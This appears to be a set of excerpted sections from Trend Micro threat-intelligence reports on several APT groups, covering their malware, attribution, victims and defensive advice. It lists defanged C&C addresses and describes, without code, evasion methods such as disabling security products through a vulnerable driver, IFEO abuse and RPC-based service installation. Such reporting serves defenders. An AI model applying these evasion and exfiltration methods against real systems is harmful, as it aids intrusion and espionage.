[{"title": "Introduction", "content": "In early 2021, we published a research paper discussing the operation of a China-linked threat actor we tracked asEarth Lusca. Since our initial research, the group has remained active and has even extended its operations, targeting countries around the world during the first half of 2023.\nWhile monitoring the group, we managed to obtain an interesting, encrypted file hosted on the threat actor's delivery server. We were able to find the original loader of the file on VirusTotal and successfully decrypted it. Interestingly, the decrypted payload is a Linux-targeted backdoor that we have never seen before. The main execution routine and its strings show that it originates from the open-source Windows backdoorTrochilus, with several functions being re-implemented for Linux systems. We named this new Linux variant SprySOCKS, referring to the swift behaviors of Trochilus and the new Socket Secure (SOCKS) implementation inside the backdoor.\nAnalysis of the SprySOCKS backdoor reveals some interesting findings. The backdoor contains a marker that refers to the backdoor's version number. We have identified two SprySOCKS payloads that contain two different version numbers, indicating that the backdoor is still under development. In addition, we noticed that the implementation of the interactive shell is likely inspired from the Linux variant of the Derusbi malware.\nMeanwhile, the structure of SprySOCKS's command-and-control (C&C) protocol is similar to one used by theRedLeaves backdoor, a remote access trojan (RAT)reportedto be infecting Windows machines. It consists of two components, the loader and the encrypted main payload. The loader is responsible for reading, decrypting, and running the main payload.\nSimilar to the Windows version, the Linux variant analyzed in this report also consists of these two components. Previously, it was reported that RedLeaves was also built upon the publicly available source code of Trochilus.\nSo far, we have only observed SprySOCKS used by Earth Lusca. In this blog entry, we will provide more context on Earth Lusca's use of the malware, together with a thorough analysis of its components and capabilities.", "source": "Trendmicro"}, {"title": "Attribution", "content": "We observed the encrypted SprySOCKS payload hosted on the delivery server207[.]148[.]75[.]122in early June 2023. The server, which was operated by the Earth Lusca threat actor, also delivered  executable files of Cobalt Strike and the Linux version of Winnti to its targets.\nThe SprySOCKS payload contains a version number (1.3.6) and the C&C domainlt76ux[.]confenos[.]shop. We found another SprySOCKS payload uploaded by other users on VirusTotal with a version number of 1.1 and which connected to the C&C domain2e6veme8xs[.]bmssystemg188[.]us. It's worth noting that the sibling domainrvxzn49eghqj[.]bmssystemg188[.]usresolved to38[.]60[.]199[.]208, which overlapped with793tggz7mw91[.]itcom666[.]live. The domainitcom666[.]liveis a known C&C domainattributedto Earth Lusca.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "In this report, we discussed the new backdoor SprySOCKS used by Earth Lusca, which expands the group's Linux arsenal. Recently, the threat actor has been highly aggressive in targeting the public-facing servers of its victims by exploiting known vulnerabilities.\nIt is important that organizations proactively manage their attack surface, minimizing the potential entry points into their system and reducing the likelihood of a successful breach. Businesses should regularly apply patches and update their tools, software, and systems to ensure their security, functionality, and overall performance.\nCutting-edge and adaptable security solutions likeTrend Micro XDRplay a pivotal role in safeguarding organizations against Earth Lusca and other threat actors. These technologies excel at gathering and connecting activity data across various channels, from emails and endpoints to servers, cloud workloads, and networks. This comprehensive approach empowers organizations with a high level of security detection and investigation capabilities, setting it apart from conventional security solutions.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Earth Centaur, previously known asTropic Trooper, is a long-running cyberespionage threat group that has been active since 2011. In July 2020, we noticed interesting activity coming from the group, and we have been closely monitoring it since. The actors seem to be targeting organizations in the transportation industry and government agencies related to transport.\nWe observed that the group tried to access some internal documents (such as flight schedules and documents for financial plans) and personal information on the compromised hosts (such as search histories).  Currently, we have not discovered substantial damage to these victims as caused by the threat group. However, we believe that it will continue collecting internal information from the compromised victims and that it is simply waiting for an opportunity to use this data.\nThrough long-term monitoring, we learned that this threat group is proficient at red teamwork. The group knows how to bypass security settings and keep its operation unobstructive. Depending on the target, it uses backdoors with different protocols, and it can also use the reverse proxy to bypass the monitoring of network security systems. The usage of the open-source frameworks also allows the group to develop new backdoor variants efficiently. We expand on these techniques and other capabilities in the following sections.\nMore importantly, we believe the activities we observed are just the tip of the iceberg and their targets might be expanded to other industries that are related to transportation. It is our aim, through this article, to encourage enterprises to review their own security setting and protect themselves from damage and compromise.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "These threat actors are notably sophisticated and well-equipped. Looking deeper into the new methods the group uses, we found that it has an arsenal of tools capable of assessing and then compromising its targets while remaining under the radar. For example, the group can map their target's network infrastructure and bypass firewalls. It uses backdoors with different protocols, which are deployed depending on the victim. It also has the capability to develop customized tools to evade security monitoring in different environments, and it exploits vulnerable websites and uses them as C&C servers.\nIn this blog, we outlined our new findings related to these threat actors to help possible targets in the transportation and other industries. Information on how a threat enters and operates within a victim's network is invaluable to security teams and can help them create more effective protection for vulnerable organizations. Organizations can also find capable security solutions that can help interpret and respond to malicious activities, techniques, and movements before the threat can culminate and affect an enterprise.Trend Micro Vision One\u2122\ufe0f with Managed XDRgives security teams a consolidated view into valuable insights so they can organize a more solid line of defense ahead of attacks.\nFor a list of the Indicators of Compromise, please seethis document.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Earth Estries employs two distinct attack chains in their campaigns that have some common characteristics, such as the exploitation of vulnerabilities in systems like Microsoft Exchange servers and network adapter management tools. \nThe first infection chain uses PsExec and tools such as Trillclient, Hemigate, and Crowdoor delivered via CAB files, while the second chain employs malware like Zingdoor and SnappyBee, delivered through cURL downloads. \nEarth Estries maintains persistence by continuously updating its tools and employs backdoors for lateral movement and credential theft. \nData collection and exfiltration are performed using Trillclient, while tools like cURL are used for sending information to anonymized file-sharing services, employing proxies to hide backdoor traffic.", "source": "Trendmicro"}, {"title": "Introduction", "content": "In early 2023, we published a blog entry on campaigns targeting governments and the tech industry fromEarth Estries(aka Salt Typhoon), a high-level threat actor that has been active since at least 2020.  In this report, we analyze two distinct attack chains by the group that demonstrates the varied tactics, techniques, and tools that they use to compromise targeted systems.\nThere are some commonalities between the two attack chains, like the abuse of vulnerable attack surfaces such as Microsoft Exchange servers and network adapter management tools. However, there are also significant differences. The first chain employsPsExecand WMI command-line (WMIC) for lateral movement, using tools such as Cobalt Strike, Trillclient, Hemigate, and Crowdoor, which are delivered viaCABfile packages. The second chain showcases a different approach, using malware such as Zingdoor, Cobalt Strike, and SnappyBee, as well as utility tools like PortScan and NinjaCopy, which are delivered via curl downloads.\nBoth attack chains exhibit persistence by continually updating existing employed installations of their tools, allowing for prolonged campaigns, and the ability to stay within compromised networks.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "Our analysis of Earth Estries' persistent TTPs in prolonged cyber operations reveals a sophisticated and adaptable threat actor that employs various tools and backdoors, demonstrating not only technical capabilities, but also a strategic approach to maintaining access and control within compromised environments.\nIn the first infection chain, Earth Estries exploited vulnerabilities in web-based adapter management tools like QConvergeConsole, employing tools like Cobalt Strike, Hemigate, and Crowdoor that are delivered via CAB file packages. Along with PsExec, these backdoors also facilitated lateral movement throughout the network. The incorporation of Trillclient for credential harvesting from browser caches further illustrates the group's comprehensive tactics aimed at deepening their foothold in the target environment.\nIn the second infection chain, Earth Estries capitalized on vulnerable Exchange servers, making use of web shells, such as ChinaChopper and additional backdoors such as Zingdoor, SnappyBee, and Cobalt Strike, all of which highlights the diversity of Earth Estries' toolkit. The deployment of these tools via C&C channels, alongside the use of techniques like DLL sideloading and cURL for downloading components, underscores their ability to adapt in response to defensive measures.\nThroughout their campaigns, Earth Estries has displayed a keen understanding of their target environments, by continually identifying exposed layers for re-entry. By using a combination of established tools and custom backdoors, they have created a multi-layered attack strategy that is difficult to detect and mitigate.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Trend Research uncovered a sophisticated APT campaign targeting government and telecommunications sectors in Southeast Asia. Named Earth Kurma, the attackers use advanced custom malware, rootkits, and cloud storage services for data exfiltration. Earth Kurma demonstrates adaptive malware toolsets, strategic infrastructure abuse, and complex evasion techniques. \nThis campaign poses a high business risk due to targeted espionage, credential theft, persistent foothold established through kernel-level rootkits, and data exfiltration via trusted cloud platforms. \nOrganizations primarily in government and telecommunications sectors in Southeast Asia (particularly the Philippines, Vietnam, Thailand, Malaysia) are affected. Organizations face potential compromise of sensitive government and telecommunications data, with attackers maintaining prolonged, undetected access to their networks. \nTrend Vision One\u2122 detects and blocks the malicious components used in the APT campaign. Trend Vision One customers can also access hunting queries, threat insights, and threat intelligence reports to gain rich context and the latest updates on Earth Kurma.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Since June 2024, we uncovered a sophisticated APT campaign targeting multiple countries in Southeast Asia, including the Philippines, Vietnam, and Malaysia. We have named the threat actors behind this campaign \"Earth Kurma.\" Our analysis revealed that they primarily focused on government sectors, showing particular interest in data exfiltration. Notably, this wave of attacks involved rootkits to maintain persistence and conceal their activities.\nIn this research, we provide the intelligence on Earth Kurma and their ongoing activities. We'll disclose technical details, including their tactics, techniques and procedures (TTPs), as well as specifics on their toolsets, such as TESDAT, SIMPOBOXSPY, KRNRAT, and MORIYA, among others.", "source": "Trendmicro"}, {"title": "Attribution", "content": "Our analysis identified weak links to two groups, ToddyCat and Operation TunnelSnake. After a thorough examination, we determined that this campaign merited a separate designation, Earth Kurma.\nThe APT group ToddyCat was first disclosed in 2022. The \"tailored loader,\" mentioned in thisToddyCat report, was also found in the same victim machines infected by the TESDAT loaders. However, we did not find any process execution logs between these loaders. Also, they share similar exfiltration PowerShell scripts. The tool SIMPOBOXSPY used by Earth Kurma was also used by ToddyCat before.\nBoth Earth Kurma and ToddyCat highly targeted Southeast Asian countries. Reports on ToddyCat indicate that activities started in 2020. The timeline of their activities aligned closely to what we observed in Earth Kurma.\nHowever, SIMPOBOXSPY is a simple tool that could be shared among groups, and we did not observe other exclusive tools that can be directly attributed to ToddyCat. Thus, we cannot conclusively link Earth Kurma to ToddyCat.\nThe second potentially related APT group is Operation TunnelSnake, which was also reported in 2021. In the report they used MORIYA, which uses the same code base as the MORIYA variant we found. Additionally, Operation TunnelSnake targeted countries in Southeast Asia. Nevertheless, we didn't observe any similarity in the post-exploitation stages.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Since early 2022, we have been monitoring an APT campaign that targets several government entities worldwide, with a strong focus in Southeast Asia, but also seen targeting Europe, America, and Africa. The threat actor exploits public-facing servers and sends spear phishing emails to deliver previously unseen backdoors.\nOur research allowed us to identify the campaign's multiple connections with a China-nexus threat actor we track asEarth Lusca. However, since the campaign employs independent infrastructure and unique backdoors, we believe it to be a separate intrusion set that we named Earth Krahang. We will examine these connections, as well aspotential linksto a Chinese company named I-Soon, in a separate section.\nOne of the threat actor's favorite tactics involves using its malicious access to government infrastructure to attack other government entities, abusing the infrastructure to host malicious payloads, proxy attack traffic, and send spear-phishing emails to government-related targets using compromised government email accounts. Earth Krahang also uses other tactics, such as building VPN servers on compromised public-facing servers to establish access into the private network of victims and performing brute-force attacks to obtain email credentials. These credentials are then used to exfiltrate victim emails, with the group's ultimate goal being cyberespionage.\nDue to mistakes on the attacker's side, we managed to retrieve multiple files from Earth Krahang's servers, including samples, configuration files, and log files from its attack tools. Combining this information with our telemetry helped us understand the Earth Krahang operation and build a clear view of the threat actor's victimology and interests. In addition, we will also share their preferred malware families and post-exploitation tools in this report.", "source": "Trendmicro"}, {"title": "Victimology", "content": "We found approximately 70 different victims (organizations that were confirmed to be compromised) spread across 23 different countries. Since we had access to some of Earth Krahang's logs, we were also able to identify 116 different targets (including those that were not confirmed to be compromised) in 35 countries.\nIn total, the threat actor was able to compromise or target victims in 45 different countries spread across different regions, most of them in Asia and America, but also in Europe and Africa.\nGovernment organizations seem to be Earth Krahang's primary targets. As an example, in the case of one country, we found that the threat actor compromised a diverse range of organizations belonging to 11 different government ministries.\nWe found that at least 48 government organizations were compromised, with a further 49 other government entities being targeted. Foreign Affairs ministries and departments were a top target, compromising 10 such organizations and targeting five others.\nEducation is another sector of interest to the threat actor. We found at least two different victims and 12 targets belonging to this sector. The communications industry was also targeted; we found multiple compromised telecommunications providers. Other target organizations and entities include post offices (targeted in at least three different countries), logistics platforms, and job services.\nThere were other industries targeted, but on a smaller scale, including the following:\nFinance/Insurance \nFoundations/NGOs/Thinkthanks \nHealthcare \nIT \nManufacturing \nMedia \nMilitary \nReal estate \nRetail \nSports \nTourism", "source": "Trendmicro"}, {"title": "Attribution", "content": "Initially, we had no attribution for this campaign since we found no infrastructure overlaps, and had never seen the RESHELL malware family before. Palo Alto published areportthat attributes, with moderate confidence, a particular cluster using RESHELL malware toGALLIUM. However, the assessment is based on a toolset that is shared among many different threat actors, and we were hesitant to use this link for proper attribution.  We also considered the possibility that RESHELL is a shared malware family.\nEarth Krahang switched to the XDealer malware family in later campaigns. Ina research paperpresented by TeamT5, XDealer was shown to be associated withLuoyu, a threat actor with Chinese origins that used theWinDealerand ReverseWindow malware families. Our colleague, who was previously involved in the research of Luoyu, shared with us the insights on this association, particularly the sharing of an encryption key between an old XDealer sample and a SpyDealer sample - suggesting a connection between both malware families. ESET, which named this malware DinodasRAT, wrote anextensive reporton its features. However they had no particular attribution apart from the possible China-nexus origin.\nWhile we believe it could be possible that this campaign has links to LuoYu, we found no traces of other malware families used by this threat actor. Also, the encryption key mentioned above is different from the samples we found in this campaign, meaning that this malware family has multiple builders. This could suggest that either the key was changed at some point in development, or that the tool is shared among different groups.\nIn January 2022, we reported on a China-nexus threat actor we calledEarth Lusca, following up with updates on their use of a newly discovered backdoor namedSprySOCKSand their recent activitiescapitalizingon the Taiwanese presidential election. During our investigation, we noticed malware being downloaded from IP addresses we attribute to Earth Lusca (45[.]32[.]33[.]17 and 207[.]148[.]75[.]122, for example) at the lateral movement stage of this campaign. This suggests a strong link between this threat actor and Earth Lusca. We also found infrastructure overlaps between some C&C servers that communicated with malware we found during our investigation, and domain names such asgoogledatas[.]comthat we attribute to Earth Lusca.\nWhile the infrastructure and the preference of the initial stage backdoors look to be very different between this new campaign and the previously reported activities of Earth Lusca, our speculation is that they are two intrusion sets running independently but targeting a similar range of victims, becoming more intertwined as they approach their goal - possibly even being  managed by the same threat group. Due to these characteristics, we decided to give the independent name, Earth Krahang, to this intrusion set.\nOur previous report suggests Earth Lusca might be the penetration team behind the Chinese company I-Soon, which had their information leaked on GitHub recently. Using this leaked information, we found that the company organized their penetration team into two different subgroups. This could be the possible reason why we saw two independent clusters of activities active in the wild but with limited association. Earth Krahang could be another penetration team under the same company.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "In this report, we shared our investigation on a new campaign we named Earth Krahang. Our findings show that this threat actor focuses its efforts on government entities worldwide and abuses compromised government infrastructure to enable its malicious operations.\nWe were also able to identify two unique malware families used in Earth Krahang's attacks while also illustrating the larger picture involving the group's targets and malicious activities via our telemetry data and the exposed files on their servers.\nOur investigation also identified multiple links between Earth Krahang and Earth Lusca. We suspected these two intrusion sets are managed by the same threat actor.\nGiven the importance of Earth Krahang's targets and their preference of using compromised government email accounts, we strongly advise organizations to adhere to security best practices, including educating employees and other individuals involved with the organization on how to avoid social engineering attacks, such as developing a healthy skepticism when it involves potential security issues, and developing habits such as refraining from clicking on links or opening attachments without verification from the sender. Given the threat actor's exploitation of vulnerabilities in its attacks, we also encourage organizations to update their software and systems with the latest security patches to avoid any potential compromise.", "source": "Trendmicro"}, {"title": "Introduction", "content": "We discovered a new campaign by Earth Longzhi (asubgroup of APT41) that targets organizations based in Taiwan, Thailand, the Philippines, and Fiji. This recent campaign, which follows months of dormancy, abuses a Windows Defender executable to perform DLL sideloading while also exploiting a vulnerable driver,zamguard64.sys, to disable security products installed on the hosts via a bring-your-own-vulnerable-driver (BYOVD)attack. We also found that Earth Longzhi uses a new way to disable security products, a technique we've dubbed \"stack rumbling\" via Image File Execution Options (IFEO), which is a new denial-of-service (DoS) technique.\nIn addition, we've noticed that this campaign installs drivers as kernel-level services by using MicrosoftRemote Procedure Call(RPC) instead of using general Windows application programming interfaces (APIs). This is a stealthy way to evade typical API monitoring. We also found some interesting samples in our investigation that contained information not only on Earth Longzhi's potential targets, but also techniques for possible use in future campaigns. This blog entry seeks to forewarn readers that Earth Longzhi remains active and continues to improve its tactics, techniques, and procedures (TTPs).", "source": "Trendmicro"}, {"title": "findings", "content": "During threat hunting, we found related samples on a third-party malware scanning service provider and started tracking the samples as Roxwrapper. Roxwrapper is disguised as a normal DLL file,srpapi.dll,and works as a dropper. We checked Roxwrapper's embedded content and found Bigpipeloader as one of the embedded components used in its previous campaign. Bigpipeloader was previously used in past Earth Longzhi-related samples. Roxwrapper's more complicated encryption suggests that the attackers might still be testing it to see if it can better evade security products.\nTable 1 shows all the components dropped by Roxwrapper and their corresponding descriptions:\nTable 1. List of components dropped by Roxwrapper\nAlthough Roxwrapper is not in the DLL file samples used in the actual incidents, this information is nonetheless noteworthy because it can be indicative of Earth Longzhi's potential targets. Also, the information points to a new component,dwm.exe,which is a new privilege escalation tool that abuses Task Scheduler.", "source": "Trendmicro"}, {"title": "Targets", "content": "A closer look at the samples we've gathered reveals that the group's new campaign is aimed at the Philippines, Thailand, Taiwan, and Fiji. Government, healthcare, technology, and manufacturing comprise the affected industries. Organizations in the Philippines, Thailand, and Taiwan had already been among Earth Longzhi's previous targets, while the attacks on Fiji-based firms were the first we've seen in our monitoring of the group. Based on the document embedded in the samples that wesaw, Vietnam and Indonesia are possibly the group's next targeted countries.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "In the fourth quarter of 2022, we discovered a newsubgroup of APT41that we tracked as Earth Longzhi. In the process, we revealed two different campaigns that took place from 2020 to 2022. This follow-up article to our previousreportaims to flag readers that Earth Longzhi remains in circulation and is expected to improve its TTPs. Here, we revealed that the campaign deployed a fakempclient.dll,launched through signed Windows Defender binaries, to decrease its risk of exposure. To evade and disable security products, Earth Longzhi adopted the following approaches:\nIt used Microsoft Windows RPC to create a system service instead of standard Windows APIs. \nIt terminated running security products via a vulnerable driver,zamguard64.sys,which is essentially a BYOVD attack. \nIt modified IFEO registries to restrict the execution of security products.\nWe also shared some interesting threat-hunting findings. Although the samples that we've collected resemble testing files, they can still be useful because they contain information on Earth Longzhi's potential targets and new techniques that it might employ in the future. From the embedded documents that we've collected, we can infer that Vietnam and Indonesia are the countries that they will likely aim at next. Notably, the group's possible abuse of Task Scheduler to escalate privileges for persistence is a new technique that it might use in future campaigns.\nAnother noteworthy insight is that the threat actors showed an inclination for using open-source projects to implement their own tools. There is evidence to suggest that the group spruces up its toolset during periods of inactivity. With this knowledge in mind, organizations should stay vigilant against the continuous development of new stealthy schemes by cybercriminals.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Cybercriminals and nation state actors share a common interest in compromised routers that are used as an anonymization layer. \nCybercriminals rent out compromised routers to other criminals, and most likely also makes them available to commercial residential proxy providers. \nNation-state threat actors like Sandworm used their own dedicated proxy botnets, while APT group Pawn Storm had access to a criminal proxy botnet of Ubiquiti EdgeRouters \nThe EdgeRouter botnet used by Pawn Storm (disrupted by the US FBI in January 2024) goes back to 2016. \nThe botnet also includes other routers and virtual private servers (VPS). After the disruption, the botnet's operator managed to move over bots to command-and-control (C&C) infrastructure that had been newly set up. \nOn some compromised EdgeRouters, we found activity from two significant cybercriminal groups and one nation-state threat actor (Pawn Storm) \nIt is of paramount importance to secure routers and only expose them to incoming internet connections only when it is critical for the business. We provide advice for network defenders and Small Office/Home Office (SOHO) network administrators to scan their routers for indications of them being used by nation-state threat actors and cybercriminals.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Cybercriminals and Advanced Persistent Threat (APT) actors share a common interest in proxy anonymization layers and Virtual Private Network (VPN) nodes to hide traces of their presence and make detection of malicious activities more difficult. This shared interest results in malicious internet traffic blending financial and espionage motives.\nA prominent example of this includes a cybercriminal botnet (operating since at least 2016) that used compromised Ubiquiti EdgeRouter devices, which wasdisrupted by the FBIand other international partners on January 26, 2024. In April 2022, the APT group Pawn Storm (also known as APT28 and Forest Blizzard) managed to gain access to the bots in this botnet, which the threat actor then used for its own persistent espionage campaigns. Based on Trend Micro and third-party telemetry, we observed hundreds of Ubiquiti EdgeRouter routers being used for different purposes, such as Secure Shell (SSH) brute forcing, pharmaceutical spam, employing server message block (SMB) reflectors in NTLMv2 hash relay attacks, proxying stolen credentials on phishing sites, multi-purpose proxying, cryptocurrency mining , andsending spear phishing e-mails.\nWe attribute the NTLMv2 hash relay attacks and the proxying of credential phishing to Pawn Storm, while the pharmaceutical spam looks to be related to the infamous Canadian Pharmacy gang.\nThe disruption by the FBI was a court-approved action that involved changing code and settings on Ubiquiti devices. Though these changes were reversible, they have both legal restrictions and technical challenges. Likely because of these limitations, some of the bots could not get cleaned up. Furthermore, according to our research, the threat actor managed to move over some of the EdgeRouter bots from the C&C server that was taken down on January 26, 2024, to a newly set up C&C infrastructure in early February 2024.\nApart from the EdgeRouter devices, we also found compromised Raspberry Pi and other internet-facing devices in the botnet. Moreover, we found more than 350 datacenter VPS IP addresses that were still compromised even after the FBI disruption. Many of these compromised servers previously called back to the old C&C and later called back to the new C&C infrastructure. These could be easily abused by Pawn Storm or any other threat actor, as the criminal botnet operator protects their stolen assets poorly.\nAfter investigating further, we found a third significant threat actor running malware on EdgeRouter devices, some of which were being abused by Pawn Storm at the same time. This threat actor runs the so-called Ngioweb malware in memory, with no malicious files on disk. A Windows version of Ngioweb, associated with Ramnit, wasfirst described in 2018while a Linux version was later analyzed in2019and2020. It is using multiple layers of C&C infrastructure to form a botnet of reverse proxies. We found evidence that the EdgeRouters that are infected with Ngioweb malware are being used as exit nodes in a commercially available residential proxy botnet.\nPawn Storm uses a third-party criminal proxy botnet for their espionage operations. This provides the obvious advantage of having the espionage traffic mix with other cybercrime-related traffic.  Meanwhile, other APT actors have used their dedicated botnets, such as Sandworm which hadCyclops Blink, consisting of hacked Watchguard and ASUS routers, that was disrupted by the FBI and the UK National Cyber Security Centre (NCSC) in 2022. Earlier, another Sandworm botnet called VPNFilter, consisting of thousands of routers, wasdisrupted by the FBIin 2018. Other APT actors likeAPT29(also known as Midnight Blizzard) use commercially available residential proxy networks, often sourcing residential nodes via questionable methods. APT29 also regularly uses infrastructure shared with other cybercriminals to host its malware and exploits.\nInternet routers remain a popular asset for threat actors to compromise since they often have reduced security monitoring, have less stringent password policies, are not updated frequently, and may use powerful operating systems that allows for installation of malware such as cryptocurrency miners, proxies, distributed denial of service (DDoS malware), malicious scripts, and webservers.\nThis blog post is intended to help network defenders understand the risks of internet facing routers. We will also describe how Pawn Storm made use of EdgeRouters and continues to do so today, to add more details tothe advisorypublished by the FBI on February 27 2024. Finally, we will show what can be done to defend against APT groups and other cybercriminals who have significant interest in compromising and abusing internet facing routers.\nTable 1. Simultaneous activity found on compromised EdgeRouters", "source": "Trendmicro"}, {"title": "Conclusion", "content": "Cyberiminals and APT groups use anonymization tools to blend their malicious activity in with benign normal traffic. Commercial VPN services and commercially available residential proxy networks are popular options for these types of activities.\nInternet-facing devices like SOHO routers are also a popular asset for criminal purposes and espionage. While some of the networks of compromised SOHO routers may look like a zoo that anybody can abuse, especially when default credentials remain valid, malicious actors can capitalize on this noisy environment for their own benefit and make use of them discreetly.\nIn the specific case of the compromised Ubiquiti EdgeRouters, we observed that a botnet operator has been installing backdoored SSH servers and a suite of scripts on the compromised devices for years without much attention from the security industry, allowing persistent access. Another threat actor installed the Ngioweb malware that runs only in memory to add the bots to a commercially available residential proxy botnet. Pawn Storm most likely easily brute forced the credentials of the backdoored SSH servers and thus gained access to a pool of EdgeRouter devices they could abuse for various purposes.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Trend Micropreviously publisheda number of entries discussing the operations of a China-linked threat actor we track as Earth Lusca. The group, which has been active since at least 2020 and has regularly changed its modus operandi, has been known to launch several different campaigns at the same time.\nDuring our monitoring of this threat actor, we noticed a new campaign that used Chinese-Taiwanese relations as a social engineering lure to infect selected targets. We attribute this campaign to Earth Lusca with high confidence based on the tools, techniques, and procedures (TTPs) we observed in previous research.\nThe attack campaign discussed in this report has likely been active between December 2023 and January 2024, with a file that contained a lure document discussing Chinese-Taiwanese geopolitical issues. This file was created just two days before the Taiwanese national elections and the document seems to be a legitimate document stolen from a geopolitical expert from Taiwan.\nNote that arecent leakof private documents provides a new attribution path to a Chinese company calledI-Soon. We discuss these connections in a separate section in this entry. There is significant overlap between the victims, malware used, and probable location of Earth Lusca and I-Soon. This suggests, at the very least, a significant connection between these groups. Our research is continuing at this time.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "Earth Lusca remains an active threat actor that counts cyberespionage among its primary motivations. Organizations must remain vigilant against APT groups employing sophisticated TTPs. In particular, government organizations face potential harm that could affect not only national and economic security but also international relations if malicious actors were to succeed in stealing classified information. Meanwhile, businesses that fall prey to cyberespionage attacks might face a decline in customer trust and operational disruptions that in turn lead to financial repercussions.\nGiven Earth Lusca's penchant for using email, resorting to social engineering as one of its main avenues of infection, and capitalizing on relevant social and political issues as seen in this campaign, we advise individuals and organizations to adhere to security best practices, such as avoiding clicking on suspicious email and website links and updating software in a timely manner to minimize the chances of falling victim to an Earth Lusca attack", "source": "Trendmicro"}, {"title": "Introduction", "content": "Update as of 03/22/3023 2:50PM PHT: Updated the prevention and mitigation section for an additional step.\nCVE-2023-23397is a critical privilege elevation/authentication bypass vulnerability in Outlook, released as part of the March Patch Tuesday set of fixes. The vulnerability, which affects all versions of Windows Outlook, was given a 9.8 CVSS rating and is one of two zero-day exploits disclosed on March 14. We summarize the points that security teams need to know about this vulnerability and how they can mitigate the risks of this gap.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Regarded as a highly sophisticated advanced persistent threat (APT) group, the Russian-based Turla has been suspected to beoperational since at least 2004.\nTurla's group names are infamously titled after its top-class rootkits such as Snake, Venomous Bear, WhiteBear, Uroburos, Group 88, and Waterbug, all known for targeting government entities, intelligence agencies, as well as the military, educational, research, and pharmaceutical industries around the world. Like other APT groups, Turla possesses its own specifically-designed, complex tools. However, it is the threat actor's satellite-based command-and-control (C&C) mechanism that it uses in the latter stages of an attack, coupled with its ability to fly under the radar, that makes Turla stand out from its contemporaries.", "source": "Trendmicro"}, {"title": "Targets", "content": "While the previous Turla campaigns were designed to target Windows-based machines, the campaign in August 2014  was the first instance where Turla targeted the Linux operating system. Dubbed asPenguin Turla, the group used a Linux Turla module with a C/C++ executable statically linked against multiple libraries, greatly increasing its file size for this campaign.", "source": "Trendmicro"}, {"title": "Targets", "content": "Turlatargeted the foreign officesof European governments via a backdoor, with the intention of accessing highly sensitive information. The campaign targeted Microsoft Outlook and The Bat! (a popular mail client primarily used in Eastern Europe) by forwarding all outgoing emails to the attackers. The backdoor used email messages to exfiltrate data, employing specially crafted PDF documents. It also used email messages as a transport layer for its C&C server.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "The Turla group is a persistent adversary with a long history of activities. Their origins, tactics, and targets all indicate a well-funded operation with highly skilled operatives. Turla has continuously developed its tools and techniques over years and will likely keep on refining them.\nThe threat posed by groups such as Turla underscores the importance for organizations and governments to remain vigilant by staying informed, sharing intelligence, and implementing security measures that can allow both groups and individuals to better protect themselves against these kinds of threat actors.", "source": "Trendmicro"}, {"title": "Introduction", "content": "We found a malware sample allegedly capable of connecting to the Tor network to deliver its payloads. Our initial analysis of the malware, which compromised a number of organizations toward the end of September, showed that while the main malware routine contains both the real and fake payloads, it loads the fake payload once it detects sandboxing tools to evade security and analytics tools from detecting and studying the malware's real routine. Meanwhile, the real payload remains obfuscated under packing layers and subsequently connects to the Tor network. The campaign and malware, identified asRaspberry Robinby Red Canary (detected by Trend Micro as Backdoor.Win32.RASPBERRYROBIN.A), seemingly spreads to systems with worm-like capabilities (due to the use of .lnk files) via an infected USB.\nGiven the malware's layering features and the stages of its infection routine, we are still confirming its main motivation for deployment. Currently, its possible motivation ranges from theft to cyberespionage. So far, we have noted the malware's capability to hide itself via multiple layers for obfuscation, as well as its feature of delivering a fake payload once the routine detects sandboxing and analysis solutions. The group behind Raspberry Robin appears to be testing the waters to see how far its deployments can spread. Majority of the group's victims are either government agencies or telecommunication entities from Latin America, Oceania (Australia), and Europe. Given the varying samples we have acquired since detecting these deployments, we are continuing to monitor the developments for this malware as they occur.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Earth Hundun is known for targeting the Asia-Pacific and now employs updated tactics for infection spread and communication. \nThis report details how Waterbear and Deuterbear operate, including the stages of infection, command and control (C&C) interaction, and malware component behavior. \nDeuterbear, while similar to Waterbear in many ways, shows advancements in capabilities such as including support for shellcode plugins, avoiding handshakes for RAT operation, and using HTTPS for C&C communication. \nComparing the two malware variants, Deuterbear uses a shellcode format, possesses anti-memory scanning, and shares a traffic key with its downloader unlike Waterbear. \nThe evolution of Waterbear into Deuterbear indicates the development of tools for anti-analysis and detection evasion in Earth Hundun's toolbox.", "source": "Trendmicro"}, {"title": "Introduction", "content": "In ourprevious report, we introduced the sophisticated cyberespionage campaign orchestrated by Earth Hundun, a threat actor known for targeting the Asia-Pacific region using the Waterbear malware and its latest iteration, Deuterbear. We first observed Deuterbear being used by Earth Hundun in October 2022, and it has since been part of the group's subsequent campaigns.\nOur analysis provided insights into the intricate workings of the downloader, detailing its infection flow, traffic behavior, anti-analysis techniques, and evolutionary trajectory.\nIn this entry, we examine the behavior of the final Remote Access Trojan (RAT) that we recently managed to download from a C&C server, based on an Earth Hundun campaign from 2024.\nIn our first entry, we focused on the Waterbear downloader (the first stage) and examined its network behavior.This report uses a case study to describe how the threat actor uses the Waterbear RAT and plugin during the second stage and how Waterbear downloaders are spread to other machines, making it more difficult to detect and track.\nFurthermore, we examine the major updates to Deuterbear, including the ability to accept plugins with shellcode formats and the ability to function even without handshakes during RAT operation.\nFinally, we will share our findings about the interaction between Earth Hundun and its victims through the Waterbear and Deuterbear malware, showcasing the sophisticated tactics employed by this threat actor.", "source": "Trendmicro"}, {"title": "recommendation", "content": "Waterbear has gone through continuous evolution, eventually giving rise to the emergence of a new malware, Deuterbear. Interestingly, both Waterbear and Deuterbear continue to evolve independently, rather than one simply replacing the other.\nBased on thedownloader analysispresented in April 2024. We made a comprehensive examination of the RAT, which is a component seldom downloaded from the C&C server due to temporary port openings. Through a systematic comparison of Deuterbear and Waterbear in the 